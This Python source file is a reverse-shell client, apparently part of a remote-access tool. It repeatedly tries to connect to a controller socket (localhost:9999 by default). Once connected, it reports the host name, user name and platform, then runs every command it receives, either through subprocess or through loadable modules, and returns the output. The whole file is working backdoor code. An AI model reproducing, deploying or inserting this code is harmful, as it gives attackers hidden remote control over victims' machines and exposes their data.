import getpass
import os
import socket
import subprocess
import sys
import time
from contextlib import redirect_stdout
from io import StringIO

from colorama import Fore, init

init(autoreset=True)


class Client:
    def __init__(self, ip: str, port: int):
        self.host = ip
        self.port = port
        self.socket_addr = (self.host, self.port)

        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.YELLOW}Trying to connect to socket')

        while self.socket.connect_ex(self.socket_addr) != 0:
            print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.YELLOW}Waiting for connection')
            time.sleep(1)
            print(f'{Fore.RED}[-] Connection refused')

        print(f'{Fore.LIGHTGREEN_EX}[+] Connected to {self.socket_addr[0]}:{self.socket_addr[1]}')

        self.buffer_size: int = 1024 * 128
        self.separator: str = '<||>'

        os.chdir('C:\\')

        self.platform_type: str = sys.platform.lower()
        self.username = getpass.getuser()
        self.working_directory = os.getcwd()

        self.socket.send(self.working_directory.encode())
        self.socket.send(socket.gethostname().encode())
        self.socket.send(self.username.encode())
        self.socket.send('Windows'.encode() if self.platform_type == 'win32' else self.platform_type.encode())

        self.module_folder_name: str = 'Modules'
        self.module_folder: str = os.path.join(
            os.path.split(os.path.abspath(__file__))[0],
            self.module_folder_name
        )

        while True:
            command = self.socket.recv(self.buffer_size).decode()
            if command.lower() in self.get_commands:
                output = self.execute_command(command)
                self.socket.send(f'{output}{self.separator}{self.working_directory}'.encode())
            else:
                output = subprocess.getoutput(command)
                self.socket.send(f'{output}{self.separator}{self.working_directory}'.encode())

    def execute_command(self, module_name: str) -> bytes:
        stdout = StringIO()
        module_name = module_name.capitalize()

        with redirect_stdout(stdout):
            try:
                getattr(__import__(
                    f'{self.module_folder_name}.{module_name}',
                    fromlist=[module_name]),
                    module_name
                )()

                stdout = stdout.getvalue().encode()
                return stdout
            except Exception as exception:
                match type(exception).__name__:
                    case 'ModuleNotFoundError':
                        return bytes('%s does not exist' % module_name,
                                     encoding='utf-8')
                    case _:
                        return bytes(str(exception),
                                     encoding='utf-8')

    @property
    def get_commands(self):
        return [file[:-3].lower() for file in os.listdir(self.module_folder) if file.endswith('.py')]


if __name__ == '__main__':
    Client('localhost', 9999)
